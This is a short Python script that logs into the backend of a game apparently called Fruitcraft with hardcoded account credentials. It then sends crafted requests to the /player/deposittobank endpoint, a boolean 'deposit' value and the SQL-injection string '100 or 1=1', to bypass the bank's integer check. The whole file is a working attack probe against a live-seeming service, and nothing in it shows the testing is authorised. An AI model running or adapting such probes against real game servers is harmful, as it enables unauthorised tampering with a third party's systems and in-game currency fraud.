import sys, os
import json
import time
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "api")))
from fruitcraft_client import FruitClient

def main():
    print("Testing Bank Int Bypass...")
    c1 = FruitClient()
    s1, d1 = c1.login("fact11439memory24", "android_vuln_t1")
    if not s1: return
    
    print("\n[+] Testing boolean deposit")
    res = c1.post("/player/deposittobank", {"deposit": True})
    print("Deposit True:", res)
    time.sleep(2)
    
    print("\n[+] Testing string deposit logic bypass")
    res = c1.post("/player/deposittobank", {"deposit": "100 or 1=1"})
    print("Deposit SQLi eval string:", res)

if __name__ == "__main__":
    main()
